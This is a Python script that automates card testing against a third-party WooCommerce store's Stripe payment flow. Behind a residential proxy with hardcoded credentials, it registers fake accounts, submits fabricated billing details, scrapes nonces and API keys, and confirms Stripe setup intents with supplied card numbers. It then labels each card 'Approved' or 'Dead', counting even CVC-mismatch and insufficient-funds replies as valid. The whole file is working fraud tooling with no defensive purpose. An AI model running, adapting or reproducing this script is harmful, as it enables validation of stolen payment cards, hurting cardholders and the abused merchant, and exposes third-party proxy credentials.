from requests import Session
from dataclasses import dataclass
from config.ConfigsBraintree import BehaviorsBraintree

class ConfigsPAge:
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            
            except: 
                return 'value not found' 
        
    
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)


@dataclass
class GateStripe:
    def main(self,card):
        try:

            self.UseMail = BehaviorsBraintree().RandomName('correo')
            self.Name = BehaviorsBraintree().RandomName('username')
            self.ccs = card.split('|')

            if self.ccs[0].startswith("4"): self.brand = "VISA"
            if self.ccs[0].startswith("3"): self.brand = "AMEX"
            if self.ccs[0].startswith("6"): self.brand = "DISCOVER"
            elif self.ccs[0].startswith("5"): self.brand = "MASTER_CARD"
            
            self.session = Session()
            self.session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.post('https://m.stripe.com/6', headers=headers)
            apigate2 = response.json()
            muid = apigate2["muid"]
            guid = apigate2["guid"]
            sid = apigate2["sid"]
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://3acovidtesting.com/my-account/add-payment-method/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req1 = self.session.get('https://3acovidtesting.com/my-account/', headers=headers)
            self.nonce_register = BehaviorsBraintree().QueryText(self.req1.text,'name="woocommerce-register-nonce" value="','"')

            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://3acovidtesting.com','priority': 'u=0, i','referer': 'https://3acovidtesting.com/my-account/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'username': self.Name,'email': self.UseMail,'password': 'Cuenta1234','woocommerce-register-nonce': self.nonce_register,'_wp_http_referer': '/my-account/','register': 'Register',}
            response = self.session.post('https://3acovidtesting.com/my-account/', headers=headers, data=data)
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://3acovidtesting.com/my-account/edit-address/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req2 = self.session.get('https://3acovidtesting.com/my-account/edit-address/billing/', headers=headers)
            self.edit_address_bill = BehaviorsBraintree().QueryText(self.req2.text, 'name="woocommerce-edit-address-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://3acovidtesting.com','priority': 'u=0, i','referer': 'https://3acovidtesting.com/my-account/edit-address/billing/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'thwcfe_disabled_fields': '','thwcfe_disabled_sections': '','traveller_first_name': 'saddada','traveller_last_name': 'fsafafasf','billing_first_name': 'saddada','billing_last_name': 'fsafafasf','billing_address_1': 'Times Square, Nueva York, EE. UU.','billing_address_2': '','billing_company': '','billing_city': 'Manhattan','billing_state': 'NY','billing_postcode': '10036','billing_country': 'US','billing_phone': '+526466308864','billing_email': self.UseMail,'save_address': 'Save address','woocommerce-edit-address-nonce': self.edit_address_bill,'_wp_http_referer': '/my-account/edit-address/billing/','action': 'edit_address',}
            response = self.session.post('https://3acovidtesting.com/my-account/edit-address/billing/', headers=headers, data=data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://3acovidtesting.com/my-account/edit-address/billing/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://3acovidtesting.com/my-account/edit-address/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://3acovidtesting.com/my-account/payment-methods/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req3 = self.session.get('https://3acovidtesting.com/my-account/add-payment-method/', headers=headers)
            payment_nonce = BehaviorsBraintree().QueryText(self.req3.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.wp_nonce = BehaviorsBraintree().QueryText(self.req3.text,'"rest_nonce":"','"')
            self.account = BehaviorsBraintree().QueryText(self.req3.text,'"account":"','"')
            self.pk = BehaviorsBraintree().QueryText(self.req3.text,'"api_key":"','"')

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','origin': 'https://3acovidtesting.com','priority': 'u=1, i','referer': 'https://3acovidtesting.com/my-account/add-payment-method/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest','x-wp-nonce': self.wp_nonce,}
            self.req4 = self.session.post('https://3acovidtesting.com/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent', headers=headers,)
            self.client_secret = BehaviorsBraintree().QueryText(self.req4.text,'{"client_secret":"','"')
            recortado_token = self.client_secret[:29]

            headers = {'accept': 'application/json','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://js.stripe.com','priority': 'u=1, i','referer': 'https://js.stripe.com/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = f'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]=10036&payment_method_data[card][number]={self.ccs[0]}&payment_method_data[card][cvc]={self.ccs[3]}&payment_method_data[card][exp_month]={self.ccs[1]}&payment_method_data[card][exp_year]={self.ccs[2]}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0dfb345d69%3B+stripe-js-v3%2F0dfb345d69%3B+card-element&payment_method_data[referrer]=https%3A%2F%2F3acovidtesting.com&payment_method_data[time_on_page]=802041&expected_payment_method_type=card&use_stripe_sdk=true&key={self.pk}&_stripe_account={self.account}&client_secret={self.client_secret}'
            self.req5 = self.session.post(f'https://api.stripe.com/v1/setup_intents/{recortado_token}/confirm', headers=headers, data=data,)
            self.session.close()

            msg = BehaviorsBraintree().QueryText(self.req5.text,'"message": "', '"')
            st = BehaviorsBraintree().QueryText(self.req5.text,'"status":"', '"')

            if st == "success":
                status = "Approved! ✅"
                msg = "Success $0"
            elif "security code is incorrect" in msg:
                status = "Approved! ✅"
            elif "funds" in msg:
                status = "Approved! ✅"
            else:
                status = "Dead! ❌"

            return status, msg


        except: return 'Dead! ❌','Your card was declined.'

